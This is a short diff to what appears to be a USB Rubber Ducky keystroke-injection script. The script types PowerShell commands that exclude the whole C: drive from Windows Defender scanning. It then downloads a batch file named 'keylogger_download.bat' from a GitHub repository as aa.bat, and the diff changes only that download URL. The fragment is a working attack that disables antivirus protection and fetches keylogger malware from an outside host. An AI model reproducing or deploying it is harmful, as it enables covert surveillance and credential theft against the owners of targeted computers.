@@ -13,7 +13,7 @@ STRING Add-MpPreference -ExclusionPath "C:\"
 DELAY 300
 ENTER
 DELAY 500
-STRING Invoke-WebRequest -Uri "https://github.com/USB-Rubber-Ducky1/PAYLOAD/raw/main/keylogger_download.bat" -OutFile "aa.bat"
+STRING Invoke-WebRequest -Uri "https://github.com/USB-Rubber-Ducky1/executable/raw/main/keylogger_download.bat" -OutFile "aa.bat"
 DELAY 300
 ENTER
 DELAY 1500
